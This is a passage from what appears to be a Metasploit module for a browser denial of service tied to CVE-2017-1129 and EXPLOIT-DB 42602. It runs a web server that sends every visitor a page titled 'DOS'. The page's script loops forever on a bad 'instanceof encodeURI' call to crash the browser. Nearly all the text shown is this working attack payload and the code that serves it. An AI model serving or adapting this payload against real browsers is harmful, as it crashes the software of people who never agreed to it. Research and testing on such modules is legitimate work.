
          [ 'EXPLOIT-DB', '42602'],
          [ 'CVE', '2017-1129' ]
        ],
        'DisclosureDate' => "August 31 2017",
        'Actions'        => [[ 'WebServer' ]],
        'PassiveActions' => [ 'WebServer' ],
        'DefaultAction'  => 'WebServer'
      )
    )
  end

  def run
    exploit # start http server
  end

  def setup
    @html = %|
    <html><head><title>DOS</title>
<script type="text/javascript">
while (true) try {
                var object = { };
                function d(d0) {
                        var d0 = (object instanceof encodeURI)('foo');
                }
                d(75);
        } catch (d) { }
</script>
</head></html>
    |
  end

  def on_request_uri(cli, _request)
    print_status('Sending response')
    send_response(cli, @html)
  end
end
